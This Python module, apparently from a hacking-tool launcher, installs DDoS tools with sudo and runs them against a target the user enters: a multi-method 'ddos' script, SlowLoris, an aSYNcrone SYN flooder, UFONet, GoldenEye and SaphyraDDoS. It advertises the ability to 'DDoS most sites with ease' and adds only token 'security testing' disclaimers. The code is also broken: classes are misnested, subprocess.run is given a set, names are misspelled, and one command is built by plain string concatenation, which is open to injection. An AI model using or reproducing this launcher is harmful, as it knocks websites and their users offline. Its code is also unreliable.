import os
import subprocess
from core import FingerOfGod
from core import FingerOfGodCollection


class ddos(FingerOfGod):
    TITLE = "ddos"
    DESCRIPTION = (
        "Best DDoS Attack Script With 36 Plus Methods!"
        "DDoS attacks\n\b "
        "for SECURITY TESTING PURPOSES ONLY"
    )

    INSTALL_COMMANDS = [
        "git clone https://github.com/the-deepnet/ddos.git",
        "cd ddos;sudo pip3 install - requirements.txt",
    ]
    PROJECT_URL = "https://github.com/the-deepnet/ddos"


def run(self):
    method = input(" Enter Method >> ")
    url = input(" Enter URL >> ")
    threads = input(" Enter Threads >> ")
    proxylist = input(" Enter Proxylist >> ")
    multiple = input(" Enter Multiple >> ")
    timer = input(" Enter Timer >> ")
    os.system("cd ddos;")
    subprocess.run(
        {
            "sudo",
            "python3 ddos",
            method,
            url,
            "socks_type5.4.1",
            threads,
            proxylist,
            multiple,
            timer,
        }
    )

    class SlowLoris(FingerOFGod):
        TITLE = "SlowLoris"
        DESCRIPTION = (
            "Slowloris is basically an HTTP Denial of Service attack"
            "It sends lots of HTTP requests"
        )
        INSTALL_COMMANDS = ["sudo pip3 install slowloris"]

        def run(self):
            target_site = input("Enter Target Site:- ")
            subprocess.run(["slowloris", target_site])


    class Asyncrone(FingerOfGod):
        TITLE = ""
        DESCRIPTION = (

        )
        INSTALL_COMMANDS = [
            "git clone https://github.com/fatih4842/aSYNcrone.git",
            "cd aSYNcrone;sudo gcc aSYNcrone.c -o aSYNcrone -lpthread",
        ]
        PROJECT_URL = "https://github.com/fatih4842/aSYNcrone"

        def run(self):
            source_port = input("Enter Source Port >> ")
            target_ip = input("Enter Targte IP >> ")
            target_port = input("Enter Target Port >> ")
            os.system("cd aSYNcrone;")
            subprocess.run(
                ["sudo", "./aSYNcrone", source_port, target_ip, target_port, 1000]
            )


class UFONet(FingerOfGod):
    TITLE = "UFONet"
    DESCRIPTION = (
        "UFONet - is a free software, p2p and cryptopraphic "
        "-disruptive \n toolkit- that allows you to perform DoS and "
        "DDoS attacks \n\b"
        "More Usage Visit"
    )
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/epsylon/ufonet.git",
        "cd ufonet;sudo python3 setup.py install;sudo pip3 install GeoIP;sudo pip3 install python-geoip;sudo pip3 install requests;sudo pip3 install pycrypto;sudo pip3 install pycurl;sudo pip3 install whois;sudo pip3 install scapy-python3",
    ]
    RUN_COMMANDS =  ["sudo python3 ufonet --gui"]
    PROJECT_URL = "https://github.com/epsylon/ufonet"


class GoldenEye(FingerOfGod):
    TITLE = "GoldenEye"
    DESCRIPTION = (
        "GoldenEye is a python3 app for SECURITY TESTING PURPOSES ONLY!\n"
        "GoldenEye is an HTTP DoS Test Tool."
    )
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/jseidl/GoldenEye.git;"
        "chmod -R 755 GoldenEye"
    ]
    PROJECT_URL = "https://github.com/jseidl/GoldenEye"

    def run(self):
        os.system("cd GoldenEye ;sudo ./goldeneye.py")
        print("\033[96m Go to Directory \n [*] USAGE: .\goldeneye.py <url> [OPTIONS]")


class Saphyra(FingerOFGod):
    TITLE = "SaphyraDDoS"
    DESCRIPTION = "A complex python tool to DDoS most sites with ease!"
    INSTALL_COMMANDS = [
        "sudo su",
        "git clone https://github.com/anonymous24x7/Saphyra-DDoS.git",
        "cd Saphyra-DDoS",
        "chmod +x saphyra.py",
        "python saphyra.py",
    ]
    PROJECT_URL = "https://github.com/anonymous24x7/Saphyra-DDoS"

    def run(self):
        url = input("Enter URL >> ")
        try:
            os.system("python saphyra.py " + url)
        except Exception:
            print("Enter a valid URL")


class DDOSTools(FingerOfGodCollection):
    TITLE = "DDOS Attack Tools"
    TOOLS = [SlowLoris(), Asyncrone(), UFONnet(), GoldenEye(), Saphyra()]